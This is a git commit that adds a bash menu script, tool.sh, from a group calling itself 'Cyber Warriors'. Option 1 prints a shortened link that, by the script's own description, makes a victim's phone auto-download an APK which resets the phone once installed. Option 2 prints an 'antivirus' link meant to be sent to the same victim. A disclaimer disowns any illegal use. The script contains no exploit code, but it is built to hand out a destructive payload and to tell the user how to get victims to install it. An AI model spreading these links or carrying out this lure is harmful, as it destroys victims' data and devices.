f190bb1225b75cf5fd63422f414d0d5cf6a78b20
John Kener <73270248+John-kener@users.noreply.github.com>
2020-12-05 20:35:38 +0530

    Create tool.sh

---
+++ base/tool.sh
@@ -0,0 +1,164 @@
+#colour codes
+
+r='\e[1;31m'
+g='\e[1;32m'
+y='\e[1;33m'
+b='\e[1;34m'
+p='\e[1;35m'
+lb='\e[1;36m'
+gr='\e[1;30m'
+wh='\e[1;37m'
+
+# LANCHING TOOL
+
+clear
+echo -e $b" BANNER "
+echo -e $wh"                                                   V1.0"
+echo
+echo -e $r"☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰"
+echo
+echo -e $b"
+               ⛨_☬<<<<<< 𝐒𝐄𝐋𝐄𝐂𝐓 𝐀 𝐎𝐏𝐓𝐈𝐎𝐍 >>>>>>☬_⛨"
+echo
+echo
+echo -e "\e[1;33m                 [1]  GET VIRUS APK                      ";                                                                                                                                                             
+echo -e "\e[1;33m                 [2]  GET ANTIVIRUS APK                 ";
+echo -e "\e[1;33m                 [3]  about this tool  ( guide )          ";                                                                                                                                                             
+echo -e "\e[1;33m                 [4]  exit         ";
+echo
+echo -e $wh"╔═════════════════════════════════════════════════════════════════"
+echo -e $wh"║"
+echo -e $wh"║"
+echo -e $wh"║"
+echo -e $wh"║"
+read -p'╚════>>> ' userinput1;
+if [ "${userinput1:-}" = "1" ]
+then
+clear
+echo
+echo
+echo -e $r"                ☠☠☠☠☠☠☠☛ VIRUS APK LINK ☚☠☠☠☠☠☠☠"
+echo
+echo
+echo -e $wh"
+  You can get a below this which can make path to a
+  website that automatically download a small apk file.
+  And after the victim installed that apk in his phone,
+  the virus will store there and phone will be reset 
+  "
+  echo
+ echo -e $y"       https://bit.ly/3ild93L "
+echo
+echo
+echo -e $g"  CYBER WARRIORS DOESN'T FORCE YOU
+  TO DO ANY ILLEGAL ACTIVITY ......
+  AND WE DOESN'T CARE ANY GUARANTEE 
+  AFTER EFFECTS OF THIS TOOL "
+echo
+echo
+echo
+while true; do
+
+    read -p "DO YOU WANT TO GO BACK TO THE TOOL  ? ( y /n ) :- " yn
+
+    case $yn in
+
+        [Yy]* ) cd && cd Cyber-virus && cd base && bash tool.sh  ; break;;
+
+        [Nn]* ) figlet THANK YOU |lolcat && sleep 2 && exit ;;
+
+        * ) echo "Please answer   yes    or    no.";;
+
+    esac
+
+done
+
+fi
+if [ "${userinput1:-}" = "2" ]
+then
+clear
+   echo
+   echo
+   echo -e $b "           ⚜⚜⚜⚜⚜⚜⚜⚜ ☛ ANTIVIRUS APK LINK ☚ ⚜⚜⚜⚜⚜⚜⚜⚜"
+   echo
+   echo
+echo -e $wh"
+  You will be able to restore data and remove virus
+  from victim's phone .just send this link to him and 
+  the apk will automatically download ...! And after
+  he installed that his phone will be normal
+  "
+  echo
+echo -e $y"       https://bit.ly/3fX8ljZ"
+echo
+echo
+echo -e $g"  CYBER WARRIORS DOESN'T FORCE YOU
+  TO DO ANY ILLEGAL ACTIVITY ......
+  AND WE DOESN'T CARE ANY GUARANTEE 
+  AFTER EFFECTS OF THIS TOOL "
+echo
+echo
+echo
+   while true; do
+
+    read -p "DO YOU WANT TO GO BACK TO THE TOOL  ? ( y /n ) :- " yn
+
+    case $yn in
+
+        [Yy]* ) cd && cd Cyber-virus && cd base && bash tool.sh  ; break;;
+
+        [Nn]* ) figlet THANK YOU |lolcat && sleep 2 && exit ;;
+
+        * ) echo "Please answer   yes    or    no.";;
+
+    esac
+
+done
+
+fi
+if [ "${userinput1:-}" = "3" ]
+then
+clear
+echo
+echo
+echo -e " FULL GUIDE FOR RUN THE TOOL :- #LINK  " 
+echo 
+echo
+echo -e $b " ☬ THIS VIRUS TOOL WAS CREATED BY JOHN KENER
+  WHO IS THE OWNER OF CYBER WARRIORS COMMUNITY ."
+  echo -e $g " 
+  YOU CAN JOIN WITH US FOR MORE EDUCATION 
+  
+⛨  contact us on whatsapp (to join groups) :-
+       https://bit.ly/37weRen
+       https://bit.ly/36H7cL8
+                                           
+⛨  our telegram group :-   http://t.me/@By_sstp
+  
+⛨  our youtube channel :-
+       https://www.youtube.com/channel/UCOC4YlK-7mb5jIbCRcuijvQ
+  "
+  echo
+  echo
+  echo
+  while true; do
+
+    read -p "DO YOU WANT TO GO BACK TO THE TOOL  ? ( y /n ) :- " yn
+
+    case $yn in
+
+        [Yy]* ) cd && cd Cyber-virus && cd base && bash tool.sh  ; break;;
+
+        [Nn]* ) figlet THANK YOU |lolcat && sleep 2 && exit ;;
+
+        * ) echo "Please answer   yes    or    no.";;
+
+    esac
+
+done
+
+fi
+if [ "${userinput1:-}" = "4" ]
+then
+    figlet THANK YOU |lolcat
+    fi
